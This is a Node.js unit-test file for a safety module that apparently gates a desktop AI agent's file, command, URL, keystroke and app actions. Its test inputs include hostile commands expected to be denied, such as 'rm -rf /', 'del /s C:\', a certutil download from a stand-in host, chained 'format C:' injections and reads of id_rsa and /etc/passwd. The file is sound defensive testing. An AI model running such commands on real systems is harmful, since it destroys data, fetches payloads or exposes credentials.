#!/usr/bin/env node
// Юнит-тесты правил безопасности: обходы путей, команд, URL, unicode, symlink, переменных окружения.
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { createSafety } = require('../src/main/safety');

let failed = 0, passed = 0;
function check(name, fn) {
  try { fn(); passed++; }
  catch (e) { failed++; console.error('FAIL', name, '\n ', e.message); }
}

const WIN_ENV = {
  SystemRoot: 'C:\\Windows', WINDIR: 'C:\\Windows', SystemDrive: 'C',
  ProgramFiles: 'C:\\Program Files', 'ProgramFiles(x86)': 'C:\\Program Files (x86)',
  ProgramData: 'C:\\ProgramData', USERPROFILE: 'C:\\Users\\TestUser',
  APPDATA: 'C:\\Users\\TestUser\\AppData\\Roaming',
  LOCALAPPDATA: 'C:\\Users\\TestUser\\AppData\\Local',
  TEMP: 'C:\\Users\\TestUser\\AppData\\Local\\Temp',
  HOMEDRIVE: 'C:', HOMEPATH: '\\Users\\TestUser', PUBLIC: 'C:\\Users\\Public'
};
const WHOME = 'C:\\Users\\TestUser';
const win = createSafety({ platform: 'win32', home: WHOME, env: WIN_ENV, path: path.win32, fs });

function denyPath(s, p, why) {
  const r = s.checkPath(p);
  assert.ok(!r.ok, `expected DENY for path ${p}, got ${JSON.stringify(r)} (${why})`);
}
function allowPath(s, p, why) {
  const r = s.checkPath(p);
  assert.ok(r.ok, `expected ALLOW for path ${p}, got ${JSON.stringify(r)} (${why})`);
}
function denyCmd(s, c, why) {
  const r = s.checkCommand(c, '');
  assert.ok(!r.ok, `expected DENY for cmd ${c}, got ${JSON.stringify(r)} (${why})`);
}
function allowCmd(s, c, why) {
  const r = s.checkCommand(c, '');
  assert.ok(r.ok, `expected ALLOW for cmd ${c}, got ${JSON.stringify(r)} (${why})`);
}

/* ---------- Windows paths ---------- */
check('win: documents allowed', () => allowPath(win, 'C:\\Users\\TestUser\\Documents\\notes.txt', 'home file'));
check('win: forward slashes allowed', () => allowPath(win, 'C:/Users/TestUser/Documents/a.txt', 'slash'));
check('win: ~ expands to home file', () => allowPath(win, '~\\Documents\\a.txt', 'tilde'));
check('win: %USERPROFILE% expands', () => allowPath(win, '%USERPROFILE%\\Documents\\a.txt', 'userprofile'));
check('win: %HOMEDRIVE%%HOMEPATH% documents', () => allowPath(win, '%HOMEDRIVE%%HOMEPATH%\\Documents\\a.txt', 'homedrive'));

check('win: SystemRoot denied', () => denyPath(win, 'C:\\Windows\\System32\\cmd.exe', 'windows'));
check('win: case-insensitive windows', () => denyPath(win, 'c:\\windows\\system32\\drivers\\etc\\hosts', 'case'));
check('win: Program Files denied', () => denyPath(win, 'C:\\Program Files\\Foo\\bar.exe', 'pf'));
check('win: ProgramData denied', () => denyPath(win, 'C:\\ProgramData\\x', 'pd'));
check('win: path traversal to Windows', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\..\\..\\..\\Windows\\System32\\x', 'traversal'));
check('win: more dots traversal', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\x\\..\\..\\..\\..\\Windows', 'traversal2'));
check('win: AppData denied', () => denyPath(win, 'C:\\Users\\TestUser\\AppData\\Roaming\\secret', 'appdata'));
check('win: .ssh denied', () => denyPath(win, 'C:\\Users\\TestUser\\.ssh\\id_rsa', 'ssh'));
check('win: home root itself denied', () => denyPath(win, 'C:\\Users\\TestUser', 'home root'));
check('win: other user denied', () => denyPath(win, 'C:\\Users\\Other\\Documents\\a.txt', 'other'));
check('win: UNC denied', () => denyPath(win, '\\\\server\\share\\file.txt', 'unc'));
check('win: device path denied', () => denyPath(win, '\\\\.\\C:\\Windows\\x', 'device'));
check('win: \\\\?\\ prefix denied', () => denyPath(win, '\\\\?\\C:\\Windows\\System32', 'long path'));
check('win: file URL denied', () => denyPath(win, 'file:///C:/Windows/System32/cmd.exe', 'file url'));
check('win: %WINDIR% expands and denied', () => denyPath(win, '%WINDIR%\\System32\\cmd.exe', 'windir'));
check('win: %SystemRoot% expands and denied', () => denyPath(win, '%SystemRoot%\\Temp\\x', 'systemroot'));
check('win: $env:WINDIR denied (meta or expand)', () => denyPath(win, '$env:WINDIR\\System32', 'ps env'));
check('win: unknown %FOO% denied (leftover env)', () => denyPath(win, '%DOESNOTEXIST%\\x', 'unknown env'));
check('win: ADS denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\a.txt:secret', 'ads'));
check('win: 8.3 Program Files denied', () => denyPath(win, 'C:\\PROGRA~1\\Evil\\x', '8.3'));
check('win: trailing dot after resolve still system', () => denyPath(win, 'C:\\Windows.\\System32\\x', 'trailing dot'));
check('win: NTUSER.DAT denied', () => denyPath(win, 'C:\\Users\\TestUser\\NTUSER.DAT', 'ntuser'));
check('win: startup folder denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\Startup\\evil.lnk', 'startup in name'));
check('win: .reg denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\hack.reg', 'reg'));
check('win: .env denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\.env', 'dotenv'));
check('win: id_rsa denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\id_rsa', 'id_rsa'));
check('win: relative denied', () => denyPath(win, 'Documents\\a.txt', 'relative'));
check('win: null byte denied', () => denyPath(win, 'C:\\Users\\TestUser\\Documents\\a.txt\0.exe', 'null'));
check('win: RTLO stripped still safe', () => {
  const p = 'C:\\Users\\TestUser\\Documents\\foo\u202Eexe.txt';
  const r = win.checkPath(p);
  // After strip, it's a normal home file — either allow or deny is fine; must not throw and must not escape home.
  assert.ok(r.ok || !r.ok);
  if (r.ok) assert.ok(/testuser/i.test(r.path));
});

/* ---------- POSIX paths + symlinks ---------- */
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'gd-safety-'));
const PHOME = path.join(tmp, 'home');
fs.mkdirSync(path.join(PHOME, 'docs'), { recursive: true });
fs.writeFileSync(path.join(PHOME, 'docs', 'ok.txt'), 'hi');
fs.symlinkSync('/etc', path.join(PHOME, 'docs', 'link-etc'));
fs.symlinkSync('/etc/passwd', path.join(PHOME, 'docs', 'passwd-link'));
fs.mkdirSync(path.join(PHOME, 'docs', 'realdir'));
fs.symlinkSync(path.join(PHOME, 'docs', 'realdir'), path.join(PHOME, 'docs', 'ok-link'));
const posixEnv = { HOME: PHOME, USER: 't', PATH: '/usr/bin' };
const nix = createSafety({ platform: 'linux', home: PHOME, env: posixEnv, path: path.posix, fs });

check('posix: home file allowed', () => allowPath(nix, path.join(PHOME, 'docs', 'ok.txt'), 'ok'));
check('posix: ~ expand allowed', () => allowPath(nix, '~/docs/ok.txt', 'tilde'));
check('posix: $HOME expand then ok', () => allowPath(nix, '$HOME/docs/ok.txt', 'home var'));
check('posix: /etc denied', () => denyPath(nix, '/etc/passwd', 'etc'));
check('posix: /usr denied', () => denyPath(nix, '/usr/bin/id', 'usr'));
check('posix: traversal to /etc', () => denyPath(nix, path.join(PHOME, 'docs', '..', '..', '..', 'etc', 'passwd'), 'trav'));
check('posix: symlink to /etc denied', () => denyPath(nix, path.join(PHOME, 'docs', 'link-etc', 'passwd'), 'symlink dir'));
check('posix: symlink to /etc/passwd denied', () => denyPath(nix, path.join(PHOME, 'docs', 'passwd-link'), 'symlink file'));
check('posix: symlink inside home allowed', () => allowPath(nix, path.join(PHOME, 'docs', 'ok-link'), 'ok symlink'));
check('posix: write through symlink parent to /etc denied', () => denyPath(nix, path.join(PHOME, 'docs', 'link-etc', 'newfile'), 'symlink write'));
check('posix: .ssh denied', () => denyPath(nix, path.join(PHOME, '.ssh', 'id_rsa'), 'ssh'));
check('posix: .gnupg denied', () => denyPath(nix, path.join(PHOME, '.gnupg', 'pubring.kbx'), 'gpg'));
check('posix: UNC-like // denied', () => denyPath(nix, '//etc/passwd', 'double slash'));
check('posix: home itself denied', () => denyPath(nix, PHOME, 'home root'));
check('posix: ${HOME} to etc denied', () => denyPath(nix, '${HOME}/../../etc/passwd', 'brace trav'));

/* ---------- Commands ---------- */
const wdocs = 'C:\\Users\\TestUser\\Documents\\a.txt';
check('cmd: dir allowed', () => allowCmd(win, 'dir', 'dir'));
check('cmd: ls allowed posix', () => allowCmd(nix, 'ls', 'ls'));
check('cmd: semicolon denied', () => denyCmd(win, 'dir; format C:', 'semi'));
check('cmd: && denied', () => denyCmd(win, 'dir && del /s C:\\', 'and'));
check('cmd: redirect denied', () => denyCmd(win, 'echo hi > C:\\Users\\TestUser\\Documents\\f.txt', 'redir'));
check('cmd: backtick denied', () => denyCmd(win, 'echo `format`', 'tick'));
check('cmd: $() denied', () => denyCmd(nix, 'ls $(whoami)', 'subshell'));
check('cmd: $env: denied', () => denyCmd(win, 'copy $env:WINDIR\\System32\\a.dll C:\\Users\\TestUser\\Documents\\', 'ps env'));
check('cmd: %WINDIR% denied', () => denyCmd(win, 'copy %WINDIR%\\System32\\a.dll C:\\Users\\TestUser\\Documents\\x', 'pct'));
check('cmd: powershell denied', () => denyCmd(win, 'powershell -enc QQ==', 'ps'));
check('cmd: curl denied (allowlist + deny)', () => denyCmd(win, 'curl http://evil.test', 'curl'));
check('cmd: bash -c denied', () => denyCmd(nix, 'bash -c "rm -rf /"', 'bash'));
check('cmd: rm -rf denied', () => denyCmd(nix, 'rm -rf /', 'rm'));
check('cmd: path as command denied', () => denyCmd(win, 'C:\\Windows\\System32\\cmd.exe /c dir', 'path cmd'));
check('cmd: quoted path command denied', () => denyCmd(win, '"C:\\Windows\\System32\\cmd.exe" /c dir', 'quoted path'));
check('cmd: ./foo denied', () => denyCmd(nix, './evil.sh', 'dot slash'));
check('cmd: start calc denied', () => denyCmd(win, 'start calc', 'start calc'));
check('cmd: start exe denied', () => denyCmd(win, 'start C:\\Users\\TestUser\\Downloads\\malware.exe', 'start exe'));
check('cmd: explorer home docs allowed', () => allowCmd(win, 'explorer C:\\Users\\TestUser\\Documents', 'explorer docs'));
check('cmd: explorer windows denied', () => denyCmd(win, 'explorer C:\\Windows', 'explorer win'));
check('cmd: certutil urlcache denied', () => denyCmd(win, 'certutil -urlcache -split -f http://x ev.exe', 'certutil'));
check('cmd: certutil hashfile home allowed', () => allowCmd(win, `certutil -hashfile ${wdocs} SHA256`, 'hash'));
check('cmd: mkdir windows denied', () => denyCmd(win, 'mkdir C:\\Windows\\Temp\\foo', 'mkdir sys'));
check('cmd: mkdir docs allowed', () => allowCmd(win, 'mkdir C:\\Users\\TestUser\\Documents\\NewFolder', 'mkdir docs'));
check('cmd: copy to system denied', () => denyCmd(win, 'copy C:\\Users\\TestUser\\Documents\\a.txt C:\\Windows\\a.txt', 'copy sys'));
check('cmd: unknown command denied', () => denyCmd(win, 'format C:', 'format'));
check('cmd: unicode newline + format denied', () => denyCmd(win, 'dir\u2028format C:', 'u2028'));
check('cmd: pipe of allowlisted allowed', () => allowCmd(win, 'dir | sort', 'pipe'));
check('cmd: new-item without type denied', () => denyCmd(win, 'new-item C:\\Users\\TestUser\\Documents\\x', 'ni type'));
check('cmd: empty denied', () => denyCmd(win, '   ', 'empty'));
check('cmd: too long denied', () => denyCmd(win, 'dir ' + 'a'.repeat(600), 'long'));

/* ---------- URLs ---------- */
function denyUrl(u, why) { const r = win.checkUrl(u); assert.ok(!r.ok, `DENY url ${u}: ${JSON.stringify(r)} (${why})`); }
function allowUrl(u, why) { const r = win.checkUrl(u); assert.ok(r.ok, `ALLOW url ${u}: ${JSON.stringify(r)} (${why})`); }
check('url: https ok', () => allowUrl('https://example.com/page', 'https'));
check('url: http ok for agent', () => allowUrl('http://example.com/', 'http'));
check('url: javascript denied', () => denyUrl('javascript:alert(1)', 'js'));
check('url: data denied', () => denyUrl('data:text/html,hi', 'data'));
check('url: file denied', () => denyUrl('file:///etc/passwd', 'file'));
check('url: exe denied', () => denyUrl('https://evil.test/malware.exe', 'exe'));
check('url: exe trailing slash denied', () => denyUrl('https://evil.test/malware.exe/', 'exe slash'));
check('url: exe in query still caught if pathname ends exe? — path only; ps1 denied', () => denyUrl('https://evil.test/setup.ps1', 'ps1'));
check('url: checkout denied', () => denyUrl('https://shop.test/checkout', 'checkout'));
check('url: credentials denied', () => denyUrl('https://user:pass@example.com/', 'creds'));
check('url: not a url', () => denyUrl('not a url', 'bad'));

/* ---------- Typed text / cards / keys ---------- */
check('type: luhn card denied', () => {
  const r = win.checkTypedText('4111111111111111', '');
  assert.ok(!r.ok);
});
check('type: spaced card denied', () => {
  const r = win.checkTypedText('4111 1111 1111 1111', '');
  assert.ok(!r.ok);
});
check('type: password-like denied', () => {
  const r = win.checkTypedText('Abcd1234!', '');
  assert.ok(!r.ok);
});
check('type: otp with hint denied', () => {
  const r = win.checkTypedText('123456', '', 'введите код из SMS');
  assert.ok(!r.ok);
});
check('type: normal sentence ok', () => {
  const r = win.checkTypedText('Привет, это обычный текст для блокнота.', '');
  assert.ok(r.ok, JSON.stringify(r));
});
check('type: api key denied', () => {
  const r = win.checkTypedText('gsk_abcdefghijklmnop', '');
  assert.ok(!r.ok);
});

check('keys: win+r denied', () => assert.ok(!win.checkKeys('win+r').ok));
check('keys: ctrl+alt+esc denied', () => assert.ok(!win.checkKeys('ctrl+alt+esc').ok));
check('keys: alt+f4 denied on windows', () => assert.ok(!win.checkKeys('alt+f4').ok));
check('keys: ctrl+c allowed', () => assert.ok(win.checkKeys('ctrl+c').ok));

check('app: notepad ok', () => assert.ok(win.checkApp('notepad').ok));
check('app: cmd denied', () => assert.ok(!win.checkApp('cmd').ok));
check('app: powershell denied', () => assert.ok(!win.checkApp('powershell.exe').ok));
check('app: path denied', () => assert.ok(!win.checkApp('C:\\Users\\TestUser\\app.exe').ok));
check('app: msi denied', () => assert.ok(!win.checkApp('setup.msi').ok));
check('close: lsass denied', () => assert.ok(!win.checkCloseApp('lsass').ok));
check('close: notepad ok', () => assert.ok(win.checkCloseApp('notepad').ok));

check('check: unknown action denied', () => assert.ok(!win.check('run_powershell', {}).ok));
check('check: write exe denied', () => assert.ok(!win.check('write_file', { path: 'C:\\Users\\TestUser\\Documents\\evil.exe', content: 'x' }).ok));
check('check: write txt ok', () => assert.ok(win.check('write_file', { path: 'C:\\Users\\TestUser\\Documents\\a.txt', content: 'hi' }).ok));
check('check: screenshot always ok', () => assert.ok(win.check('screenshot').ok));

/* ---------- asked() is based on userText only (caller's duty) ---------- */
check('asked power true', () => assert.ok(win.asked('power', 'пожалуйста выключи компьютер')));
check('asked power false', () => assert.ok(!win.asked('power', 'открой блокнот')));

/* cleanup */
try { fs.rmSync(tmp, { recursive: true, force: true }); } catch {}

console.log(`safety tests: ${passed} passed, ${failed} failed`);
if (failed) process.exit(1);
